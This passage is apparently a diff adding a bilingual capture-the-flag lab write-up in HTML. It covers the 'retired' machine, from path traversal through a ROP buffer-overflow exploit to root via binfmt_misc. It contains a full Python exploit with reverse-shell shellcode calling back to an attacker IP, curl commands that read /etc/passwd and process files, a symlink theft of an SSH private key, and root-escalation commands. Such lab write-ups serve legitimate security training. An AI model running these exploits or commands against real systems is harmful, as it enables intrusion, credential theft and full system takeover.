+                <pre><code class="language-plaintext">enabled
+interpreter /tmp/privesc
+flags: OC
+offset 0
+magic 7f454c4602010100000000000000000003003e0001000000d04700000000</code></pre>
+
+                <p>Now when I execute any binary matching those magic bytes (like <code>newgrp</code>), the kernel will
+                    instead execute <code>/tmp/privesc</code> with the original file's permissions (SUID root):</p>
+
+                <pre><code class="language-bash">newgrp</code></pre>
+                <pre><code class="language-bash">root@retired:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),1001(dev)</code></pre>
+
+                <h2>Exploitation Method 2 - File Extension</h2>
+                <p>An alternative approach using file extensions. First, create a symbolic link with a custom extension
+                    to a SUID binary:</p>
+
+                <pre><code class="language-bash">ln -s /usr/bin/passwd /tmp/exploit.pwn</code></pre>
+
+                <p>Register a handler for the <code>.pwn</code> extension:</p>
+                <pre><code class="language-bash">echo ':pwn2:E::pwn::/tmp/privesc:C' | /usr/lib/emuemu/reg_helper</code></pre>
+
+                <p>Verifying registration:</p>
+                <pre><code class="language-bash">cat /proc/sys/fs/binfmt_misc/pwn2</code></pre>
+                <pre><code class="language-plaintext">enabled
+interpreter /tmp/privesc
+flags: OC
+extension .pwn</code></pre>
+
+                <p>Executing the symlink triggers the interpreter with SUID privileges:</p>
+                <pre><code class="language-bash">/tmp/exploit.pwn</code></pre>
+                <pre><code class="language-bash">root@retired:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),1001(dev)</code></pre>
+
+                <p>Both methods successfully escalate privileges to root. I can now retrieve the root flag and complete
+                    the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo expone una aplicación web con un
+                        parámetro <code>page</code> vulnerable que permite lectura arbitraria de archivos mediante un
+                        bypass de path traversal. Al eludir la función de sanitización, pude leer el código fuente de
+                        archivos PHP y descubrir un binario escuchando en el puerto 1337 que procesa archivos de
+                        licencia.</p>
+
+                    <p>El análisis del binario <code>activate_license</code> reveló una vulnerabilidad de buffer
+                        overflow en el manejo de la longitud del mensaje. A pesar de tener habilitadas las protecciones
+                        NX, PIE y ASLR, construí una cadena ROP usando <code>mprotect</code> para hacer el stack
+                        ejecutable, luego usé un gadget JMP RSP para ejecutar shellcode, obteniendo acceso inicial como
+                        <code>www-data</code>.
+                    </p>
+
+                    <p>Para la escalada de privilegios al usuario <code>dev</code>, exploté una vulnerabilidad de
+                        enlaces simbólicos en el script de backup web que se ejecuta periódicamente. Al crear un enlace
+                        simbólico a <code>/home/dev/.ssh/id_rsa</code>, pude extraer la clave privada SSH del archivo
+                        de backup generado.</p>
+
+                    <p>Finalmente, para escalar a root, abusé del binario <code>reg_helper</code> con la capacidad
+                        <code>CAP_DAC_OVERRIDE</code>, que permite escribir en
+                        <code>/proc/sys/fs/binfmt_misc/register</code>. Al registrar un manejador de formato binario
+                        personalizado con la flag "C" (ejecutar con permisos del archivo original), secuestré la
+                        ejecución de binarios SUID para obtener una shell root.
+                    </p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> Bypass de filtro de path traversal, buffer overflow con
+                        cadena ROP, explotación de <code>mprotect</code>, lectura arbitraria de archivos mediante
+                        enlaces simbólicos, abuso de registro binfmt_misc con CAP_DAC_OVERRIDE.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comenzando con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución en el
+                    objetivo:</p>
+                <p><img src="./media/image1.png"
+                        alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 80" />
+                </p>
+
+                <p>El escaneo revela un servidor HTTP en el puerto 80 y SSH en el puerto 22. El parámetro
+                    <code>page</code> en la URL inmediatamente parece sospechoso y digno de investigación.
+                </p>
+
+                <h2>Enumeración Web</h2>
+                <p>La aplicación web anuncia varios servicios:</p>
+                <p><img src="./media/image2.png"
+                        alt="Página principal de la aplicación web mostrando servicios anunciados" /></p>
+
+                <p>Ejecutando whatweb se revela información importante sobre las tecnologías:</p>
+                <pre><code class="language-bash">whatweb http://10.129.227.96</code></pre>
+
+                <p>La salida muestra:</p>
+                <pre><code class="language-plaintext">http://10.129.227.96 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.129.227.96], RedirectLocation[/index.php?page=default.html], nginx
+http://10.129.227.96/index.php?page=default.html [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[10.129.227.96], PHP, Script, Title[Agency - Start Bootstrap Theme], nginx</code></pre>
+
+                <p>Esto revela PHP y nginx como tecnologías clave a tener en cuenta.</p>
+
+                <h3>Fuzzing de Directorios</h3>
+                <p>Realizando fuzzing de directorios se revela una página interesante, <code>beta.html</code>:</p>
+                <pre><code class="language-plaintext">css                 (Status: 301) [Size: 162] [--&gt; http://10.129.227.96/css/]
+js                  (Status: 301) [Size: 162] [--&gt; http://10.129.227.96/js/]
+assets              (Status: 301) [Size: 162] [--&gt; http://10.129.227.96/assets/]
+beta.html           (Status: 200) [Size: 4144]
+index.php           (Status: 302) [Size: 0] [--&gt; /index.php?page=default.html]
+default.html        (Status: 200) [Size: 11414]</code></pre>
+
+                <p>También puedo acceder a esta página a través del parámetro potencialmente vulnerable
+                    <code>page</code>:
+                </p>
+                <pre><code class="language-plaintext">http://10.129.227.96/index.php?page=beta.html</code></pre>
+
+                <p>Sin embargo, intentar path traversal directo está bloqueado, sugiriendo que hay algún filtrado
+                    implementado.</p>
+
+                <h2>Funcionalidad de Subida de Archivos</h2>
+                <p>La página beta contiene una funcionalidad interesante de subida de archivos:</p>
+                <p><img src="./media/image3.png"
+                        alt="Página beta mostrando formulario de subida de archivos para activación de licencia" /></p>
+
+                <p>Probando la subida con una webshell muestra que hace una petición POST a
+                    <code>activate_license.php</code>, que devuelve una página en blanco sin respuesta visible. El
+                    fuzzing de directorios no revela ningún directorio de subida obvio donde puedan almacenarse los
+                    archivos.
+                </p>
+
+                <h2>Descubrimiento del Código Fuente</h2>
+                <p>Investigando el parámetro <code>page</code> más a fondo, descubro que al solicitar archivos PHP
+                    devuelve su código fuente en lugar de ejecutarlos:</p>
+
+                <pre><code class="language-bash">curl http://10.129.227.96/index.php?page=activate_license.php</code></pre>
+
+                <p>Esto revela la lógica de procesamiento de licencias:</p>
+                <pre><code class="language-php">&lt;?php
+if(isset($_FILES['licensefile'])) {
+    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
+    $license_size = $_FILES['licensefile']['size'];
+
+    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+    if (!$socket) { echo "error socket_create()\n"; }
+
+    if (!socket_connect($socket, '127.0.0.1', 1337)) {
+        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
+    }
+
+    socket_write($socket, pack("N", $license_size));
+    socket_write($socket, $license);
+
+    socket_shutdown($socket);
+    socket_close($socket);
+}
+?&gt;</code></pre>
+
+                <p>Esto revela un servicio ejecutándose en el puerto 1337 que procesa estos archivos de licencia.</p>
+
+                <h3>Análisis del Código Fuente de index.php</h3>
+                <p>Solicitando el código fuente del index.php principal revela la lógica de sanitización:</p>
+                <pre><code class="language-php">&lt;?php
+function sanitize_input($param) {
+    $param1 = str_replace("../","", $param);
+    $param2 = str_replace("./","", $param1);
+    return $param2;
+}
+
+$page = $_GET['page'];
+if (isset($page) &amp;&amp; preg_match("/^[a-z]/", $page)) {
+    $page = sanitize_input($page);
+} else {
+    header('Location: /index.php?page=default.html');
+}
+
+readfile($page);
+?&gt;</code></pre>
+
+                <p>Esto revela varios hallazgos importantes:</p>
+                <ul>
+                    <li>Está usando <code>readfile()</code> - una vulnerabilidad de lectura arbitraria de archivos, no
+                        LFI</li>
+                    <li>El filtro de path traversal es inseguro y puede eludirse</li>
+                    <li>Hay una vulnerabilidad Execute After Redirect (EAR) - no hay declaración <code>die()</code>
+                        después de la redirección</li>
+                </ul>
+
+                <h2>Bypass del Filtro de Path Traversal</h2>
+                <p>La función de sanitización es vulnerable porque realiza reemplazos de un solo paso. Por ejemplo, la
+                    cadena <code>...../</code> se convierte en:</p>
+
+                <ol>
+                    <li>Después de <code>str_replace("../","",$param)</code>: <code>..//</code></li>
+                    <li>Después de <code>str_replace("./","",$param1)</code>: <code>../</code></li>
+                </ol>
+
+                <p>Probando este bypass para leer <code>/etc/hostname</code>:</p>
+                <pre><code class="language-bash">curl http://10.129.10.252/index.php?page=js/.....///.....///.....///.....///.....///.....///.....///etc/hostname</code></pre>
+
+                <p>Respuesta:</p>
+                <pre><code class="language-plaintext">retired</code></pre>
+
+                <h3>Explotación de Execute After Redirect (EAR)</h3>
+                <p>Debido a la falta de la declaración <code>die()</code>, <code>readfile($page)</code> se ejecuta
+                    incluso cuando falla la validación regex y se desencadena una redirección. Con curl, esto es
+                    directo ya que no sigue redirecciones por defecto:</p>
+
+                <pre><code class="language-bash">curl http://10.129.227.96/index.php?page=../../../../../../etc/passwd | grep bash</code></pre>
+
+                <p>Esto devuelve información de usuarios:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+vagrant:x:1000:1000::/vagrant:/bin/bash
+dev:x:1001:1001::/home/dev:/bin/bash</code></pre>
+
+                <p>Esta misma técnica funciona con Burp Suite interceptando y modificando la respuesta de redirección.
+                </p>
+
+                <h2>Reconocimiento del Sistema vía Lectura de Archivos</h2>
+                <p>Leyendo la configuración de nginx se revela el directorio raíz web:</p>
+                <pre><code class="language-bash">curl http://10.129.10.252/index.php?page=../../../../../../etc/nginx/sites-enabled/default</code></pre>
+
+                <pre><code class="language-nginx">server {
+    listen 80 default_server;
+    listen [::]:80 default_server;
+
+    root /var/www/html;
+
+    index index.php index.html index.htm;
+
+    server_name _;
+
+    location / {
+        try_files $uri $uri/ =404;
+    }
+
+    location ~ \.php$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
+    }
+}</code></pre>
+
+                <h3>Descubriendo Puertos Abiertos</h3>
+                <p>Leyendo <code>/proc/net/tcp</code> revela los puertos TCP abiertos localmente:</p>
+                <pre><code class="language-bash">curl http://10.129.10.252/index.php?page=../../../../../../proc/net/tcp</code></pre>
+
+                <p>La entrada importante:</p>
+                <pre><code class="language-plaintext">2: 0100007F:0539 00000000:0000 0A 00000000:00000000 00:00000000 00000000    33</code></pre>
+
+                <p>Convirtiendo desde hexadecimal: <code>0100007F:0539</code> → <code>127.0.0.1:1337</code></p>
+
+                <p>Esto confirma el servicio mencionado en <code>activate_license.php</code>.</p>
+
+                <h2>Enumeración de Procesos</h2>
+                <p>Creé un script bash para enumerar procesos vía la interfaz <code>/proc/{PID}/cmdline</code>:</p>
+
+                <pre><code class="language-bash">#!/bin/bash
+
+TARGET="http://10.129.10.252/index.php?page=../../../../../../.."
+OUTPUT_DIR="lfi_enum"
+mkdir -p "$OUTPUT_DIR"
+
+echo "[*] Starting LFI process enumeration..."
+
+lfi_get() {
+    curl -s "${TARGET}$1" 2&gt;/dev/null
+}
+
+for pid in {1..500}; do
+    cmdline=$(lfi_get "/proc/$pid/cmdline" | tr '\0' ' ' | strings)
+  
+    if [ ! -z "$cmdline" ] &amp;&amp; [ "$cmdline" != "Not Found" ]; then
+        echo "[+] PID $pid: $cmdline"
+        echo "$cmdline" &gt; "$OUTPUT_DIR/pid_${pid}_cmdline.txt"
+      
+        if [[ "$cmdline" == *"python"* ]] || [[ "$cmdline" == *"node"* ]] || [[ "$cmdline" == *"1337"* ]]; then
+            echo "  [!] Interesting process found!"
+          
+            lfi_get "/proc/$pid/exe" &gt; "$OUTPUT_DIR/pid_${pid}_exe"
+            lfi_get "/proc/$pid/environ" | tr '\0' '\n' &gt; "$OUTPUT_DIR/pid_${pid}_environ.txt"
+          
+            cwd=$(lfi_get "/proc/$pid/cwd")
+            echo "  [*] CWD: $cwd"
+        fi
+    fi
+  
+    sleep 0.1
+done
+
+echo "[*] Enumeration complete. Check $OUTPUT_DIR/ for results"</code></pre>
+
+                <p>Después de un tiempo, el script descubre un proceso relacionado con el puerto 1337:</p>
+                <pre><code class="language-plaintext">[*] Starting LFI process enumeration...
+[+] PID 418: /usr/bin/activate_license 1337 
+  [!] Interesting process found!
+  [*] CWD: 
+[*] Enumeration complete. Check lfi_enum/ for results</code></pre>
+
+                <p>El binario está ubicado en <code>/usr/bin/activate_license</code>, el cual descargo para análisis.
+                </p>
+
+                <h3>Información del Entorno del Proceso</h3>
+                <p>Leyendo el entorno del proceso proporciona contexto adicional:</p>
+                <pre><code class="language-bash">curl http://10.129.10.252/index.php?page=../../../../../../proc/418/environ</code></pre>
+
+                <pre><code class="language-plaintext">LANG=C.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOME=/var/wwwLOGNAME=www-dataUSER=www-dataINVOCATION_ID=72de3b3f08b340dea22ca4cea78077ccJOURNAL_STREAM=8:12309</code></pre>
+
+                <h2>Análisis del Binario - Descubrimiento de Buffer Overflow</h2>
+                <p>Analizando el binario con Ghidra revela una vulnerabilidad crítica de buffer overflow en el manejo
+                    de la longitud del mensaje:</p>
+
+                <pre><code class="language-c">char buffer[512];
+// ...
+msglen = ntohl(msglen);
+read(sockfd, buffer, (ulong)msglen);</code></pre>
+
+                <p>El problema: <code>msglen</code> se lee desde la red sin validación, permitiendo a un atacante
+                    especificar un tamaño mayor que el buffer de 512 bytes.</p>
+
+                <p>El binario también ejecuta operaciones SQL y guarda un archivo <code>license.sqlite</code> en
+                    <code>/var/www</code>. Descargándolo y examinándolo muestra:
+                </p>
+
+                <pre><code class="language-sql">sqlite&gt; select * from license;
+1|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre>
+
+                <p>Esto confirma que ya se han realizado pruebas de buffer overflow en el sistema.</p>
+
+                <h2>Análisis de Seguridad del Binario</h2>
+                <p>Comprobando las protecciones de seguridad del binario:</p>
+                <pre><code class="language-bash">checksec --file=activate_license --format=csv</code></pre>
+
+                <pre><code class="language-plaintext">Full RELRO,No Canary found,NX enabled,PIE enabled,No RPATH,No RUNPATH,Symbols,No,0,4,activate_license</code></pre>
+
+                <p>Hallazgos clave:</p>
+                <ul>
+                    <li><strong>Sin Canaries de Stack</strong> - La explotación de buffer overflow es posible</li>
+                    <li><strong>NX Habilitado</strong> - No se puede ejecutar código directamente desde el stack</li>
+                    <li><strong>PIE Habilitado</strong> - Las direcciones están aleatorizadas</li>
+                    <li><strong>Full RELRO</strong> - Las tablas GOT/PLT son de solo lectura, previniendo ataques de
+                        sobrescritura</li>
+                </ul>
+
+                <p>Estas protecciones requieren un enfoque de explotación basado en ROP.</p>
+
+                <h3>Estado de ASLR</h3>
+                <p>Comprobando si Address Space Layout Randomization está habilitado:</p>
+                <pre><code class="language-bash">curl http://10.129.10.252/index.php?page=../../../../../../proc/sys/kernel/randomize_va_space</code></pre>
+
+                <pre><code class="language-plaintext">2</code></pre>
+
+                <p>Un valor de "2" significa que ASLR completo está habilitado, aleatorizando posiciones de memoria de
+                    librerías, heap y stack.</p>
+
+                <h3>Mapeos de Memoria</h3>
+                <p>Recupero el mapa de memoria del proceso para identificar direcciones base de librerías, que serán
+                    cruciales para la cadena ROP:</p>
+
+                <pre><code class="language-bash">curl http://10.129.227.96/index.php?page=../../../../../../proc/409/maps</code></pre>
+
+                <p>Regiones de memoria clave (salida abreviada):</p>
+                <pre><code class="language-plaintext">55d582e6c000-55d582e71000 r-xp /usr/bin/activate_license
+7f31209e2000-7f3120ba3000 r-xp /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f3120ba7000-7f3120cea000 r-xp /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+7f3120cf1000-7f3120d1d000 r-xp /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7ffc2a070000-7ffc2a091000 rw-p [stack]</code></pre>
+
+                <h2>Estrategia de Explotación - Cadena ROP con mprotect</h2>
+                <p>Como NX está habilitado, usaré una cadena ROP para llamar a <code>mprotect</code> y hacer el stack
+                    ejecutable, luego saltar a shellcode. Este enfoque es más rápido que construir una cadena ROP
+                    completa de <code>execve</code>.</p>
+
+                <p>Primero, descargo <code>libc-2.31.so</code> del objetivo y encuentro el offset de
+                    <code>mprotect</code>:
+                </p>
+
+                <pre><code class="language-bash">readelf -s libc-2.31.so | grep ' mprotect'</code></pre>
+
+                <pre><code class="language-plaintext"> 1225: 00000000000f8c20    33 FUNC    WEAK   DEFAULT   14 mprotect@@GLIBC_2.2.5</code></pre>
+
+                <h3>Entendiendo los Parámetros de mprotect</h3>
+                <p>La firma de la función <code>mprotect</code>:</p>
+                <pre><code class="language-c">int mprotect(void *addr, size_t len, int prot);</code></pre>
+
+                <p>En la convención de llamada x86-64, estos parámetros se mapean a:</p>
+                <ul>
+                    <li><strong>RDI</strong> (Register Destination Index) - primer argumento (dirección)</li>
+                    <li><strong>RSI</strong> (Register Source Index) - segundo argumento (longitud)</li>
+                    <li><strong>RDX</strong> (Register Data) - tercer argumento (flags de protección)</li>
+                </ul>
+
+                <h3>Encontrando Gadgets ROP</h3>
+                <p>Usando ropper para encontrar gadgets en <code>libc-2.31.so</code>:</p>
+
+                <pre><code class="language-bash">ropper -f libc-2.31.so --search "pop rdi"</code></pre>
+                <pre><code class="language-plaintext">0x0000000000026796: pop rdi; ret;</code></pre>
+
+                <pre><code class="language-bash">ropper -f libc-2.31.so --search "pop rsi"</code></pre>
+                <pre><code class="language-plaintext">0x000000000002890f: pop rsi; ret;</code></pre>
+
+                <pre><code class="language-bash">ropper -f libc-2.31.so --search "pop rdx"</code></pre>
+                <pre><code class="language-plaintext">0x00000000000cb1cd: pop rdx; ret;</code></pre>
+
+                <h3>Encontrando Gadget JMP RSP</h3>
+                <p>Desafortunadamente, <code>libc-2.31.so</code> no contiene un gadget JMP RSP. Descargo
+                    <code>libsqlite3.so.0.8.6</code> donde este gadget existe:
+                </p>
+
+                <pre><code class="language-bash">curl http://10.129.227.96/index.php?page=../../../../../../usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 -o libsqlite3.so.0.8.6
+
+ropper -f libsqlite3.so.0.8.6 --search "jmp rsp"</code></pre>
+
+                <pre><code class="language-plaintext">[INFO] File: libsqlite3.so.0.8.6
+0x00000000000d431d: jmp rsp;</code></pre>
+
+                <h3>Direcciones Base del Mapa de Memoria</h3>
+                <p>Registrando las direcciones base importantes del mapa de memoria anterior:</p>
+                <pre><code class="language-plaintext">libsqlite3.so.0.8.6: 0x7f3120ba7000
+libc-2.31.so: 0x7f31209e2000
+Stack start: 0x7ffc2a070000
+Stack end: 0x7ffc2a091000</code></pre>
+
+                <h2>Encontrando el Offset</h2>
+                <p>Necesito determinar el offset exacto donde ocurre el buffer overflow. Primero, ejecuto el binario
+                    localmente y conecto gdb:</p>
+
+                <pre><code class="language-bash">./activate_license 1337</code></pre>
+
+                <pre><code class="language-bash">gdb -q -p $(pidof activate_license)</code></pre>
+
+                <p>Configuro gdb para seguir procesos hijos (el binario hace fork para cada conexión):</p>
+                <pre><code class="language-gdb">gdb-peda$ set follow-fork-mode child
+gdb-peda$ c</code></pre>
+
+                <p>Usando pwntools para generar y enviar un patrón cíclico:</p>
+                <pre><code class="language-python">from pwn import *
+io = remote('127.0.0.1', 1337)
+pattern = cyclic(600)
+io.send(p32(len(pattern), endian='big'))
+io.send(pattern)
+io.close()</code></pre>
+
+                <p>En gdb, el programa se cae en la instrucción return:</p>
+                <pre><code class="language-gdb">=&gt; 0x5629eae645c0 &lt;activate_license+643&gt;:    ret
+
+Stopped reason: SIGSEGV</code></pre>
+
+                <p>Comprobando el puntero de stack para encontrar el patrón:</p>
+                <pre><code class="language-gdb">gdb-peda$ x/gx $rsp
+0x7fff69904f38: 0x6661616766616166</code></pre>
+
+                <p>Calculando el offset:</p>
+                <pre><code class="language-python">python3 -c "from pwn import *; print('Offset:', cyclic_find(0x6661616766616166))"</code></pre>
+
+                <pre><code class="language-plaintext">Offset: 520</code></pre>
+
+                <h2>Generando Shellcode</h2>
+                <p>Creando un payload de reverse shell con msfvenom:</p>
+                <pre><code class="language-bash">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.172 LPORT=443 -f py -v sc</code></pre>
+
+                <pre><code class="language-plaintext">Payload size: 74 bytes
+Final size of py file: 376 bytes</code></pre>
+
+                <h2>Script de Exploit Completo</h2>
+                <p>Con todos los componentes listos, creo el exploit final que hace una petición POST a
+                    <code>activate_license.php</code>:
+                </p>
+
+                <pre><code class="language-python">#!/usr/bin/env python3
+
+import requests
+import struct
+
+# Direcciones base de /proc/PID/maps
+libc_base = 0x7f31209e2000
+libsql_base = 0x7f3120ba7000
+stack_start = 0x7ffc2a070000
+stack_end = 0x7ffc2a091000
+
+TARGET_IP = "10.129.227.96"
+URL = f'http://{TARGET_IP}/activate_license.php'
+
+# Shellcode de reverse shell
+sc = b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
+sc += b"\x48\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0a\x0e\xac"
+sc += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
+sc += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
+sc += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
+sc += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
+sc += b"\x0f\x05"
+
+def p64(num):
+    return struct.pack("&lt;Q", num)
+
+# Componentes de cadena ROP
+mprotect = p64(libc_base + 0xf8c20)
+pop_rdi  = p64(libc_base + 0x26796)
+pop_rsi  = p64(libc_base + 0x2890f)
+pop_rdx  = p64(libc_base + 0xcb1cd)
+jmp_rsp  = p64(libsql_base + 0xd431d)
+stack_size = stack_end - stack_start
+
+# Construir el buffer del exploit
+buf  = b'A' * 520                # Rellenar hasta la dirección de retorno
+buf += pop_rdi + p64(stack_start) # RDI = dirección del stack
+buf += pop_rsi + p64(stack_size)  # RSI = tamaño del stack
+buf += pop_rdx + p64(7)           # RDX = permisos rwx (7)
+buf += mprotect                   # Llamar a mprotect
+buf += jmp_rsp                    # Saltar al stack
+buf += sc                         # Shellcode de reverse shell
+
+# Enviar exploit vía subida de archivo de licencia
+resp = requests.post(URL, files={'licensefile': buf})</code></pre>
+
+                <p>Configurando un listener de netcat:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Ejecutando el exploit devuelve exitosamente una shell como <code>www-data</code>:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.14.172] from (UNKNOWN) [10.129.227.96] 56104
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@retired:/var/www/html$</code></pre>
+
+                <h2>Enumeración Interna</h2>
+                <p>Después de estabilizar la shell, comienzo el reconocimiento interno:</p>
+
+                <pre><code class="language-bash">id dev</code></pre>
+                <pre><code class="language-plaintext">uid=1001(dev) gid=1001(dev) groups=1001(dev),33(www-data)</code></pre>
+
+                <p>Buscando archivos propiedad del usuario <code>dev</code>:</p>
+                <pre><code class="language-bash">find / -user dev 2&gt;/dev/null</code></pre>
+                <pre><code class="language-plaintext">/var/www/2026-02-02_23-30-09-html.zip
+/var/www/2026-02-02_23-28-09-html.zip
+/var/www/2026-02-02_23-29-09-html.zip
+/home/dev</code></pre>
+
+                <p>Archivos propiedad del grupo <code>dev</code>:</p>
+                <pre><code class="language-bash">find / -group dev 2&gt;/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/lib/emuemu/reg_helper
+/home/dev</code></pre>
+
+                <p>Los archivos zip de backup son interesantes. El patrón de nombres sugiere backups automatizados
+                    ejecutándose cada minuto con solo 3 mantenidos al mismo tiempo.</p>
+
+                <h2>Descubriendo el Script de Backup</h2>
+                <p>Buscando el script de backup mediante grep por el patrón del nombre del archivo zip:</p>
+                <pre><code class="language-bash">grep -r '\-html.zip' / 2&gt;/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/bin/webbackup:DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"</code></pre>
+
+                <p>Examinando el script de backup:</p>
+                <pre><code class="language-bash">cat /usr/bin/webbackup</code></pre>
+
+                <pre><code class="language-bash">#!/bin/bash
+set -euf -o pipefail
+
+cd /var/www/
+
+SRC=/var/www/html
+DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
+
+/usr/bin/rm --force -- "$DST"
+/usr/bin/zip --recurse-paths "$DST" "$SRC"
+
+KEEP=10
+/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
+    | sort --zero-terminated --numeric-sort --reverse \
+    | while IFS= read -r -d '' backup; do
+        if [ "$KEEP" -le 0 ]; then
+            /usr/bin/rm --force -- "$backup"
+        fi
+        KEEP="$((KEEP-1))"
+    done</code></pre>
+
+                <p>Observaciones clave:</p>
+                <ul>
+                    <li>El script es propiedad de root pero crea archivos como el usuario <code>dev</code></li>
+                    <li>Comprime recursivamente <code>/var/www/html</code></li>
+                    <li><code>/var/www/html</code> tiene permisos de escritura para todos</li>
+                    <li>El script sigue enlaces simbólicos al crear el archivo</li>
+                </ul>
+
+                <h2>Escalada de Privilegios a dev - Ataque de Symlink</h2>
+                <p>Como el script de backup sigue enlaces simbólicos y <code>/var/www/html</code> es escribible, puedo
+                    crear un enlace simbólico a la clave privada SSH de <code>dev</code>:</p>
+
+                <pre><code class="language-bash">cd /var/www/html
+ln -s /home/dev/.ssh/id_rsa clave_filtrada</code></pre>
+
+                <pre><code class="language-bash">ls -la clave_filtrada</code></pre>
+                <pre><code class="language-plaintext">lrwxrwxrwx 1 www-data www-data 21 Feb  2 23:53 clave_filtrada -&gt; /home/dev/.ssh/id_rsa</code></pre>
+
+                <p>Monitorizando el directorio para cambios:</p>
+                <pre><code class="language-bash">watch -n 1 ls -la</code></pre>
+
+                <p>Después de aproximadamente un minuto, el enlace simbólico desaparece (se elimina por el script).
+                    Comprobando el último archivo zip de backup:</p>
+
+                <pre><code class="language-bash">unzip -l /var/www/2026-02-02_23-54-09-html.zip | grep clave_filtrada</code></pre>
+
+                <p>Extrayendo y viendo la clave privada:</p>
+                <pre><code class="language-bash">unzip -p /var/www/2026-02-02_23-54-09-html.zip var/www/html/clave_filtrada</code></pre>
+
+                <p>Copio la clave privada SSH a mi máquina local, establezco los permisos apropiados y me conecto:</p>
+                <pre><code class="language-bash">chmod 600 dev_id_rsa
+ssh -i dev_id_rsa dev@10.129.227.96</code></pre>
+
+                <p>Habiendo iniciado sesión exitosamente como <code>dev</code>, ahora puedo recuperar la flag de
+                    usuario.</p>
+
+                <h2>Escalada de Privilegios a Root - Abuso de binfmt_misc</h2>
+                <p>En el directorio home del usuario <code>dev</code>, encuentro un directorio interesante
+                    <code>emuemu</code> que contiene archivos fuente C y un Makefile:
+                </p>
+
+                <pre><code class="language-bash">ls -la ~/emuemu</code></pre>
+
+                <p>Examinando el archivo crítico <code>reg_helper.c</code>:</p>
+                <pre><code class="language-c">#define _GNU_SOURCE
+
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(void) {
+    char cmd[512] = { 0 };
+
+    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;
+
+    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
+    if (-1 == fd)
+        perror("open");
+    if (write(fd, cmd, strnlen(cmd, sizeof(cmd))) == -1)
+        perror("write");
+    if (close(fd) == -1)
+        perror("close");
+
+    return 0;
+}</code></pre>
+
+                <p>Y la sección de instalación del Makefile:</p>
+                <pre><code class="language-makefile">install: $(TARGETS)
+    @echo "[+] Installing program files"
+    install --mode 0755 emuemu /usr/bin/
+    mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
+    install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
+    setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper
+
+    @echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
+    echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
+        | tee /usr/lib/binfmt.d/emuemu.conf \
+        | /usr/lib/emuemu/reg_helper</code></pre>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>Hallazgos clave:</p>
+                <ul>
+                    <li><code>reg_helper</code> escribe la entrada del usuario directamente a
